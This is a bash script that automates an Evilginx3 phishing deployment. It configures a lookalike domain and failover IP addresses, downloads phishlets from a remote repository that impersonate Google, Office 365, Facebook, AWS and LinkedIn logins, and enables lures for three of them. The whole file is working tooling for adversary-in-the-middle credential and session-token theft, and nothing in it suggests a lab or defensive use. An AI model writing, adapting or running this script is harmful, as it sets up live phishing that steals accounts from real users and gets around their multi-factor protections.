#!/bin/bash
# === PHISHLET LAUNCH SUITE (ENTERPRISE-GRADE) ===
# Evilginx3 v3.4.1 Automation Suite
# Domain: hrahra.org | IP: Dynamic | Repo: khast3x/master

set -eo pipefail
exec > >(tee -a /var/log/evilginx3_launcher.log) 2>&1

### === CONFIGURATION ===
PHISHLETS_DIR="/opt/evilginx3/phishlets"
EVILGINX_BIN="/usr/local/bin/evilginx"
REPO="https://raw.githubusercontent.com/khast3x/evilginx3-phishlets/v3.4.1"
DOMAIN="hrahra.org"
EXTERNAL_IP="$(curl --connect-timeout 5 -s https://api.ipify.org || echo '10.0.0.1')"
REDIRECT_URL="https://redirect.target"
FAILOVER_IPS=("134.199.198.228" "129.212.187.23")

declare -A PHISHLETS=(
    ["google"]="google_v3.4.1.yaml"
    ["office365"]="o365_v3.4.1.yaml" 
    ["facebook"]="facebook_v3.4.1.yaml"
    ["aws"]="aws_v3.4.1.yaml"
    ["linkedin"]="linkedin_v3.4.1.yaml"
)

### === UTILITIES ===
log()   { echo -e "[$(date '+%Y-%m-%d %H:%M:%S')] \033[1;36m[PHISHLET]\033[0m $*"; }
fatal() { echo -e "[$(date '+%Y-%m-%d %H:%M:%S')] \033[1;31m[FATAL]\033[0m $*" >&2; exit 1; }

### === PRECHECKS ===
for cmd in curl evilginx; do
    command -v "$cmd" >/dev/null || fatal "Missing dependency: $cmd"
done

[[ -d "$PHISHLETS_DIR" ]] || mkdir -p "$PHISHLETS_DIR"

### === FAILOVER IP ROTATION ===
rotate_ip() {
    local current_ip="$EXTERNAL_IP"
    for ip in "${FAILOVER_IPS[@]}"; do
        if ping -c 1 -W 1 "$ip" &>/dev/null; then
            EXTERNAL_IP="$ip"
            [[ "$current_ip" != "$ip" ]] && log "Failover to IP: $ip"
            break
        fi
    done
}

### === PHISHLET DOWNLOAD ===
download_phishlets() {
    log "Syncing phishlets from $REPO"
    for name in "${!PHISHLETS[@]}"; do
        url="$REPO/${PHISHLETS[$name]}"
        dest="$PHISHLETS_DIR/${PHISHLETS[$name]}"
        
        if curl -fsSL --retry 2 --connect-timeout 5 "$url" -o "$dest"; then
            log "  ✓ $name (v3.4.1)"
            # Validate YAML structure
            if ! yq e '.' "$dest" &>/dev/null; then
                log "  ✘ Invalid YAML: $name"
                rm -f "$dest"
            fi
        else
            log "  ✘ Download failed: $name"
        fi
    done
}

### === EVILGINX DEPLOYMENT ===
deploy_evilginx() {
    log "Initializing Evilginx3 (v3.4.1)"
    
    # Generate config commands
    CONFIG_CMDS=$(cat <<EOF
config domain $DOMAIN
config ip $EXTERNAL_IP
config redirect_url $REDIRECT_URL
phishlets hostname google.$DOMAIN
phishlets enable google
phishlets hostname office365.$DOMAIN 
phishlets enable office365
phishlets hostname aws.$DOMAIN
phishlets enable aws
lures create google 0
lures create office365 0
lures create aws 0
EOF
    )

    # Execute with timeout
    if ! timeout 15 evilginx <<< "$CONFIG_CMDS"; then
        fatal "Evilginx configuration timeout"
    fi
}

### === MAIN EXECUTION ===
rotate_ip
download_phishlets
deploy_evilginx

log "✅ Deployment complete | IP: $EXTERNAL_IP | Phishlets: ${#PHISHLETS[@]}"